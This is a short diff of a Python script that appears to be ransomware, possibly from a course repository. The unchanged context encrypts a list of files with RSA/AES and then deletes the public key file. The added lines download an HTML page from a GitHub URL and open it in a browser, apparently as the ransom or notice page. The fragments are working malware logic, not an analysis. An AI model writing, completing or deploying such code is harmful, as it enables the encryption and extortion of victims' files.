@@ -1,5 +1,7 @@
 import os
 import socket
+import requests
+
 from Crypto.PublicKey   import RSA
 from Crypto.Cipher      import PKCS1_OAEP, AES
 from Crypto.Random      import get_random_bytes
@@ -72,4 +74,8 @@ for file_path in file_paths:
     encrypt(file_path, 'public_key.pem')
 print('\n')
 os.remove('public_key.pem')
+
+url ='https://raw.githubusercontent.com/TelmoRibeiro/SdR-B/main/README.html'
+r = requests.get(url, allow_redirects=True)
+open('README.html', 'wb').write(r.content)
 webbrowser.open_new_tab('README.html')
